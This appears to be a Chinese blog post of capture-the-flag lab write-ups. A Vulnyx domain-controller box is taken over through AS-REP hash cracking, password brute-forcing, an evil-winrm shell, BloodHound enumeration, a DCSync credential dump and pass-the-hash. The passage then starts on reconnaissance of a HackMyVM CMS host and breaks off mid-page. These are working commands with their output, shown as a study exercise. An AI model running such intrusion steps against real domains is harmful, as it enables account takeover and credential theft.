class="hljs-variable">$e746876ee8a2b48932bce457c461397d73700cc3eb7625aa9b93a650718753cae7b6a98a73714ca10b3fd380813a817df0bec981b9ae90a137d7810e0ad49a0c3dcc2681222f14338fa58f47e70dbdad8a8ba4e6c65bb3501beeffa74468e24f7c8fa3958af07d0fc03eff16ed59f10025d3705f7ccf55275777862dd59cde593f49475339b9efcf0cfd62806346d3c1e0a7a3b7fc4e4042de01e89fbd28c672e77735baae50064276a4e4979ad6c98dc03c8691d191b34e7c2cf28f26af322cf57aa3ba88fb643f8d937d582dfadac9928a5354cc4db8d1c2c81d28b4e4874628b6e46858feef80849b</span></span><br><br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">john --format=krb5asrep --wordlist=rockyou.txt hash.txt<br>Using default input encoding: UTF-8<br>Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])<br>Will run 4 OpenMP threads<br>Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status<br>101Music         ($krb5asrep$23$B.LEWIS@CONTROL.NYX)     <br>1g 0:00:00:09 DONE (2025-06-11 05:15) 0.1006g/s 1353Kp/s 1353Kc/s 1353KC/s 101eagles..1019904<br>Use the &quot;--show&quot; option to display all of the cracked passwords reliably<br>Session completed. <br><br></code></pre></td></tr></table></figure><p>尝试用winrm拿到shell，无果。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"> nxc winrm <span class="hljs-number">192.168</span>.<span class="hljs-number">56.117</span> -u <span class="hljs-selector-tag">b</span><span class="hljs-selector-class">.lewis</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-number">101</span>Music<br>WINRM       <span class="hljs-number">192.168</span>.<span class="hljs-number">56.117</span>  <span class="hljs-number">5985</span>   CONTROLER        <span class="hljs-selector-attr">[*]</span> Windows <span class="hljs-number">10</span> / Server <span class="hljs-number">2019</span> Build <span class="hljs-number">17763</span> (name:CONTROLER) (domain:control.nyx) <br>WINRM       <span class="hljs-number">192.168</span>.<span class="hljs-number">56.117</span>  <span class="hljs-number">5985</span>   CONTROLER        <span class="hljs-selector-attr">[-]</span> control.nyx\<span class="hljs-selector-tag">b</span><span class="hljs-selector-class">.lewis</span>:<span class="hljs-number">101</span>Music<br></code></pre></td></tr></table></figure><p>smb登上去查看域内用户。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell">crackmapexec smb 192.168.56.117 -u B.LEWIS -p &#x27;101Music&#x27; --users<br>SMB         192.168.56.117  445    CONTROLER        [*] Windows 10 / Server 2019 Build 17763 x64 (name:CONTROLER) (domain:control.nyx) (signing:True) (SMBv1:False)<br>SMB         192.168.56.117  445    CONTROLER        [+] control.nyx\B.LEWIS:101Music <br>SMB         192.168.56.117  445    CONTROLER        [+] Enumerated domain user(s)<br>SMB         192.168.56.117  445    CONTROLER        control.nyx\a.hansen                       badpwdcount: 1 desc: (Account Disabled)<br>SMB         192.168.56.117  445    CONTROLER        control.nyx\d.petrov                       badpwdcount: 1 desc: (Account Disabled)<br>SMB         192.168.56.117  445    CONTROLER        control.nyx\m.klein                        badpwdcount: 1 desc: (Account Disabled)<br>SMB         192.168.56.117  445    CONTROLER        control.nyx\b.lewis                        badpwdcount: 0 desc: (Account Enabled)<br>SMB         192.168.56.117  445    CONTROLER        control.nyx\j.levy                         badpwdcount: 0 desc: (Account Enabled)<br>SMB         192.168.56.117  445    CONTROLER        control.nyx\krbtgt                         badpwdcount: 0 desc: Key Distribution Center Service Account<br>SMB         192.168.56.117  445    CONTROLER        control.nyx\Guest                          badpwdcount: 0 desc: (Account Disabled)<br>SMB         192.168.56.117  445    CONTROLER        control.nyx\Administrator                  badpwdcount: 0 desc: (Account Enabled)<br><br></code></pre></td></tr></table></figure><p>发现J.Levy用户同样可用。</p><p>爆破密码。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">crackmapexec smb <span class="hljs-number">192.168</span>.<span class="hljs-number">56.117</span> -u j<span class="hljs-selector-class">.levy</span> -<span class="hljs-selector-tag">p</span> rockyou<span class="hljs-selector-class">.txt</span>         <br>SMB         <span class="hljs-number">192.168</span>.<span class="hljs-number">56.117</span>  <span class="hljs-number">445</span>    CONTROLER        <span class="hljs-selector-attr">[*]</span> Windows <span class="hljs-number">10</span> / Server <span class="hljs-number">2019</span> Build <span class="hljs-number">17763</span> x64 (name:CONTROLER) (domain:control.nyx) (signing:True) (SMBv1:False)<br>SMB         <span class="hljs-number">192.168</span>.<span class="hljs-number">56.117</span>  <span class="hljs-number">445</span>    CONTROLER        <span class="hljs-selector-attr">[-]</span> control.nyx\j<span class="hljs-selector-class">.levy</span>:<span class="hljs-number">123456</span> STATUS_LOGON_FAILURE <br>SMB         <span class="hljs-number">192.168</span>.<span class="hljs-number">56.117</span>  <span class="hljs-number">445</span>    CONTROLER        <span class="hljs-selector-attr">[-]</span> control.nyx\j<span class="hljs-selector-class">.levy</span>:<span class="hljs-number">12345</span> STATUS_LOGON_FAILURE <br>.......<br>SMB         <span class="hljs-number">192.168</span>.<span class="hljs-number">56.117</span>  <span class="hljs-number">445</span>    CONTROLER        <span class="hljs-selector-attr">[+]</span> control.nyx\j<span class="hljs-selector-class">.levy</span>:Password1 <br></code></pre></td></tr></table></figure><p>得到密码Password1</p><p>用winrm可以拿到shell。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">nxc winrm <span class="hljs-number">192.168</span>.<span class="hljs-number">56.117</span> -u j<span class="hljs-selector-class">.levy</span> -<span class="hljs-selector-tag">p</span> Password1<br>WINRM       <span class="hljs-number">192.168</span>.<span class="hljs-number">56.117</span>  <span class="hljs-number">5985</span>   CONTROLER        <span class="hljs-selector-attr">[*]</span> Windows <span class="hljs-number">10</span> / Server <span class="hljs-number">2019</span> Build <span class="hljs-number">17763</span> (name:CONTROLER) (domain:control.nyx) <br>WINRM       <span class="hljs-number">192.168</span>.<span class="hljs-number">56.117</span>  <span class="hljs-number">5985</span>   CONTROLER        <span class="hljs-selector-attr">[+]</span> control.nyx\j<span class="hljs-selector-class">.levy</span>:Password1 (Pwn3d!)<br></code></pre></td></tr></table></figure><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs smali">┌──(root㉿kali)-[/home/kali/Desktop]<br>└─<span class="hljs-comment"># evil-winrm -i 192.168.56.117 -u &#x27;j.levy&#x27; -p &quot;Password1&quot;               </span><br>                                        <br>Evil-WinRM shell v3.7<br>                                        <br>Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc&#x27; for module Reline<br>                                        <br>Data: For more information,<span class="hljs-built_in"> check </span>Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm<span class="hljs-comment">#Remote-path-completion</span><br>                                        <br>Info: Establishing connection to remote endpoint<br>*Evil-WinRM* PS C:\Users\j.levy\Documents&gt; <br></code></pre></td></tr></table></figure><p>拿到userflag。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs shell">*Evil-WinRM* PS C:\Users\j.levy\Documents&gt; dir<br>*Evil-WinRM* PS C:\Users\j.levy\Documents&gt; cd ..<br>*Evil-WinRM* PS C:\Users\j.levy&gt; cd Desktop<br>*Evil-WinRM* PS C:\Users\j.levy\Desktop&gt; dir<br><br><br>    Directory: C:\Users\j.levy\Desktop<br><br><br>Mode                LastWriteTime         Length Name<br>----                -------------         ------ ----<br>-a----       10/22/2024   2:40 PM             70 user.txt<br><br><br>*Evil-WinRM* PS C:\Users\j.levy\Desktop&gt; cat user.txt<br>587c4dac7a29c5c2a2d98732116e5bee<br>*Evil-WinRM* PS C:\Users\j.levy\Desktop&gt; <br><br></code></pre></td></tr></table></figure><h3 id="GetAdmin"><a href="#GetAdmin" class="headerlink" title="GetAdmin"></a>GetAdmin</h3><hr><p>用bloodhound分析域，上传sharphound。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">*Evil-WinRM* PS C:\Users\j.levy\Documents&gt; upload /home/kali/Desktop/SharpHound.exe<br>                                        <br>Info: Uploading /home/kali/Desktop/SharpHound.exe to C:\Users\j.levy\Documents\SharpHound.exe<br>                                        <br>Data: 1715540 bytes of 1715540 bytes copied<br>                                        <br>Info: Upload successful!<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs shell">*Evil-WinRM* PS C:\Users\j.levy\Documents&gt; .\SharpHound.exe -c All -d control.nyx<br>2025-06-11T17:40:46.0437737-07:00|INFORMATION|This version of SharpHound is compatible with the 5.0.0 Release of BloodHound<br>2025-06-11T17:40:46.1687827-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, UserRights, CARegistry, DCRegistry, CertServices, LdapServices, WebClientService, SmbInfo, NTLMRegistry<br>2025-06-11T17:40:46.1687827-07:00|INFORMATION|Initializing SharpHound at 5:40 PM on 6/11/2025<br>2025-06-11T17:40:46.3583738-07:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, UserRights, CARegistry, DCRegistry, CertServices, LdapServices, WebClientService, SmbInfo, NTLMRegistry<br>2025-06-11T17:40:46.3867934-07:00|INFORMATION|Beginning LDAP search for control.nyx<br>2025-06-11T17:40:46.4974100-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for CONTROL.NYX<br>2025-06-11T17:40:46.5902495-07:00|INFORMATION|Beginning LDAP search for control.nyx Configuration NC<br>2025-06-11T17:40:46.5902495-07:00|INFORMATION|Producer has finished, closing LDAP channel<br>2025-06-11T17:40:46.5902495-07:00|INFORMATION|LDAP channel closed, waiting for consumers<br>2025-06-11T17:40:46.7156535-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for CONTROL.NYX<br>2025-06-11T17:40:46.9349151-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for CONTROL.NYX<br>2025-06-11T17:40:52.4847691-07:00|INFORMATION|Consumers finished, closing output channel<br>2025-06-11T17:40:52.5245244-07:00|INFORMATION|Output channel closed, waiting for output task to complete<br>Closing writers<br>2025-06-11T17:40:52.5968654-07:00|INFORMATION|Status: 298 objects finished (+298 49.66667)/s -- Using 39 MB RAM<br>2025-06-11T17:40:52.5968654-07:00|INFORMATION|Enumeration finished in 00:00:06.1712809<br>2025-06-11T17:40:52.6228715-07:00|INFORMATION|Saving cache with stats: 15 ID to type mappings.<br> 0 name to SID mappings.<br> 1 machine sid mappings.<br> 3 sid to domain mappings.<br> 0 global catalog mappings.<br>2025-06-11T17:40:52.6228715-07:00|INFORMATION|SharpHound Enumeration Completed at 5:40 PM on 6/11/2025! Happy Graphing!<br>*Evil-WinRM* PS C:\Users\j.levy\Documents&gt; dir<br><br><br>    Directory: C:\Users\j.levy\Documents<br><br><br>Mode                LastWriteTime         Length Name<br>----                -------------         ------ ----<br>-a----        6/11/2025   5:40 PM          25769 20250611174047_BloodHound.zip<br>-a----        6/11/2025   5:40 PM           1288 MWMwNWZhMWQtNWU5Yi00ZGZhLTgzZDEtMDE5NjRmMmE2NWEw.bin<br>-a----        6/11/2025   5:39 PM        1286656 SharpHound.exe<br><br><br>*Evil-WinRM* PS C:\Users\j.levy\Documents&gt; download 20250611174047_BloodHound.zip<br>                                        <br>Info: Downloading C:\Users\j.levy\Documents\20250611174047_BloodHound.zip to 20250611174047_BloodHound.zip<br>                                        <br>Info: Download successful!<br><br></code></pre></td></tr></table></figure><p><img src="/2025/06/11/Vulnyx-Controler/msedge_mpQzCnreXM.png"></p><p>帮我们分析出这个用户可以执行DCsync攻击，还贴心的准备好了命令。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell">impacket-secretsdump &#x27;control.nyx&#x27;/&#x27;j.levy&#x27;:&#x27;Password1&#x27;@&#x27;192.168.56.117&#x27; -just-dc-user administrator<br>/usr/lib/python3/dist-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools&lt;81.<br>  import pkg_resources<br>Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies <br><br>[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)<br>[*] Using the DRSUAPI method to get NTDS.DIT secrets<br>Administrator:500:aad3b435b51404eeaad3b435b51404ee:48b20d4f3ea31b7234c92b71c90fbff7:::<br>[*] Kerberos keys grabbed<br>Administrator:aes256-cts-hmac-sha1-96:9a8c983c709e851258912c3b1d71c9b05faf1724f522b4f32e57f7bef3366773<br>Administrator:aes128-cts-hmac-sha1-96:0ca176565c5b47fda5e2ab4f53fbb9d3<br>Administrator:des-cbc-md5:ce9785d980c1a7f8<br>[*] Cleaning up... <br><br></code></pre></td></tr></table></figure><p>成功抓取到域管理员的哈希，最后evil-winrm登上去就行了。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(root㉿kali)-[/home/kali/Desktop]<br>└─# evil-winrm -i 192.168.56.117 -u &#x27;administrator&#x27; -H &quot;48b20d4f3ea31b7234c92b71c90fbff7&quot;<br>                                        <br>Evil-WinRM shell v3.7<br>                                        <br>Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc&#x27; for module Reline<br>                                        <br>Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion<br>                                        <br>Info: Establishing connection to remote endpoint<br>*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; cd ..<br>*Evil-WinRM* PS C:\Users\Administrator&gt; cd Desktop<br>*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; dir<br><br><br>    Directory: C:\Users\Administrator\Desktop<br><br><br>Mode                LastWriteTime         Length Name<br>----                -------------         ------ ----<br>-a----       10/22/2024   2:41 PM             70 root.txt<br><br><br>*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; cat root.txt<br>b43e4c1b7df273b73966bc038774bafd<br>*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; <br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>渗透</tag>
      
      <tag>Vulnyx</tag>
      
      <tag>域</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HackMyVM-Yansi</title>
    <link href="/2025/06/08/HackMyVM-Yansi/"/>
    <url>/2025/06/08/HackMyVM-Yansi/</url>
    
    <content type="html"><![CDATA[<p>挺友好的靶机。</p><p>靶机ip：192.168.56.116</p><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><hr><p>nmap：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs shell">nmap -T4 -A -v 192.168.56.116 <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-08 10:14 EDT<br>NSE: Loaded 156 scripts for scanning.<br>NSE: Script Pre-scanning.<br>Initiating NSE at 10:14<br>Completed NSE at 10:14, 0.00s elapsed<br>Initiating NSE at 10:14<br>Completed NSE at 10:14, 0.00s elapsed<br>Initiating NSE at 10:14<br>Completed NSE at 10:14, 0.00s elapsed<br>Initiating ARP Ping Scan at 10:14<br>Scanning 192.168.56.116 [1 port]<br>Completed ARP Ping Scan at 10:14, 0.05s elapsed (1 total hosts)<br>Initiating Parallel DNS resolution of 1 host. at 10:14<br>Completed Parallel DNS resolution of 1 host. at 10:14, 0.00s elapsed<br>Initiating SYN Stealth Scan at 10:14<br>Scanning 192.168.56.116 [1000 ports]<br>Discovered open port 80/tcp on 192.168.56.116<br>Discovered open port 22/tcp on 192.168.56.116<br>Completed SYN Stealth Scan at 10:14, 0.07s elapsed (1000 total ports)<br>Initiating Service scan at 10:14<br>Scanning 2 services on 192.168.56.116<br>Completed Service scan at 10:14, 6.06s elapsed (2 services on 1 host)<br>Initiating OS detection (try #1) against 192.168.56.116<br>NSE: Script scanning 192.168.56.116.<br>Initiating NSE at 10:14<br>Completed NSE at 10:14, 0.18s elapsed<br>Initiating NSE at 10:14<br>Completed NSE at 10:14, 0.01s elapsed<br>Initiating NSE at 10:14<br>Completed NSE at 10:14, 0.00s elapsed<br>Nmap scan report for 192.168.56.116<br>Host is up (0.00075s latency).<br>Not shown: 998 closed tcp ports (reset)<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)<br>| ssh-hostkey: <br>|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)<br>|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)<br>|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)<br>80/tcp open  http    Apache httpd 2.4.62 ((Debian))<br>|_http-server-header: Apache/2.4.62 (Debian)<br>|_http-title: CMS Portal<br>| http-methods: <br>|_  Supported Methods: OPTIONS HEAD GET POST<br>MAC Address: 08:00:27:0A:3E:91 (Oracle VirtualBox virtual NIC)<br>Device type: general purpose<br>Running: Linux 4.X|5.X<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5<br>OS details: Linux 4.15 - 5.8<br>Uptime guess: 21.103 days (since Sun May 18 07:46:31 2025)<br>Network Distance: 1 hop<br>TCP Sequence Prediction: Difficulty=254 (Good luck!)<br>IP ID Sequence Generation: All zeros<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>TRACEROUTE<br>HOP RTT     ADDRESS<br>1   0.75 ms 192.168.56.116<br><br>NSE: Script Post-scanning.<br>Initiating NSE at 10:14<br>Completed NSE at 10:14, 0.00s elapsed<br>Initiating NSE at 10:14<br>Completed NSE at 10:14, 0.00s elapsed<br>Initiating NSE at 10:14<br>Completed NSE at 10:14, 0.00s elapsed<br>Read data files from: /usr/share/nmap<br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap done: 1 IP address (1 host up) scanned in 8.06 seconds<br>           Raw packets sent: 1023 (45.806KB) | Rcvd: 1015 (41.286KB)<br></code></pre></td></tr></table></figure><p>gobuster：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs shell">gobuster dir -u 192.168.56.116 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,zip<br>===============================================================<br><br>Gobuster v3.6<br><br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br><br>[+] Url:                     http://192.168.56.116<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.6<br>[+] Extensions:              php,txt,html,zip<br><br>[+] Timeout:                 10s<br>===============================================================<br><br>Starting gobuster in directory enumeration mode<br>===============================================================<br><br>/.php                 (Status: 403) [Size: 279]<br>/.html                (Status: 403) [Size: 279]<br>/index.html           (Status: 200) [Size: 8845]<br>/login.php            (Status: 200) [Size: 8738]<br>/.php                 (Status: 403) [Size: 279]<br>/.html                (Status: 403) [Size: 279]<br>/server-status        (Status: 403) [Size: 279]<br><br>Progress: 1102800 / 1102805 (100.00%)<br>===============================================================<br><br>Finished<br>===============================================================<br></code></pre></td></tr></table></figure><p>dirsearch：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs shell">dirsearch -u 192.168.56.116<br>/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools&lt;81.<br>  from pkg_resources import DistributionNotFound, VersionConflict<br><br>  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                                           <br> (_||| _) (/_(_|| (_| )                                                                                                                                    <br>                                                                                                                                                           <br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460<br><br>Output File: /home/kali/Desktop/reports/_192.168.56.116/_25-06-08_10-25-30.txt<br><br>Target: http://192.168.56.116/<br><br>[10:25:30] Starting:                                                                                                                                       <br>[10:25:30] 403 -  279B  - /.ht_wsr.txt                                      <br>[10:25:30] 403 -  279B  - /.htaccess.orig                                   <br>[10:25:30] 403 -  279B  - /.htaccess.bak1                                   <br>[10:25:30] 403 -  279B  - /.htaccess.sample<br>[10:25:30] 403 -  279B  - /.htaccess.save<br>[10:25:30] 403 -  279B  - /.htaccess_extra                                  <br>[10:25:30] 403 -  279B  - /.htaccess_sc<br>[10:25:30] 403 -  279B  - /.htaccessOLD<br>[10:25:30] 403 -  279B  - /.htaccess_orig<br>[10:25:30] 403 -  279B  - /.htaccessBAK<br>[10:25:30] 403 -  279B  - /.htaccessOLD2                                    <br>[10:25:30] 403 -  279B  - /.htm                                             <br>[10:25:30] 403 -  279B  - /.html                                            <br>[10:25:30] 403 -  279B  - /.htpasswd_test                                   <br>[10:25:30] 403 -  279B  - /.httr-oauth<br>[10:25:30] 403 -  279B  - /.htpasswds<br>[10:25:31] 403 -  279B  - /.php                                             <br>[10:25:43] 200 -    2KB - /login.php                                        <br>[10:25:48] 403 -  279B  - /server-status/                                   <br>[10:25:48] 403 -  279B  - /server-status<br><br></code></pre></td></tr></table></figure><p>扫到的端口和界面都很少，直接访问网站主页。</p><h3 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h3><hr><p><img src="/2025/06/08/HackMyVM-Yansi/msedge_j2kYt0Mvxf.png"></p><p>点击左下角的Access Portal可以跳转到一个后台管理界面，下方提示我们是用CMS Made Simple搭建的，版本还是最新的2.21。之后点击右侧的chickhere进入管理员后台登录。</p><p><img src="/2025/06/08/HackMyVM-Yansi/msedge_BuWVKsOd4o.png"></p><p>我们再看之前的那个login.php，发现它的用户名是写死了的admin，并且底下提示了密码规则，八位数字混合字母。</p><p><img src="/2025/06/08/HackMyVM-Yansi/msedge_p30kq0Apbn.png"></p><p>（这里其实因为它本身口令就是弱口令所以很容易就能随便选个字典爆破出来，hyh大佬还用正则匹配了rockyou字典，下次如果设计的复杂点我就没这么狗运了）</p><p>爆破为admin123，但是登录之后会跳转回index。</p><p>想到cms的后台管理界面是不是也同样这个密码，使用admin:admin123登录，进入后台。（其实这里直接爆破也可以，反正都是弱密码）</p><p>之后进入扩展——用户定义标签执行RCE反弹shell（这应该是几个版本以前的了，没想到现在还没修）</p><p><img src="/2025/06/08/HackMyVM-Yansi/msedge_H0yO1WPGdX.png"></p><p><img 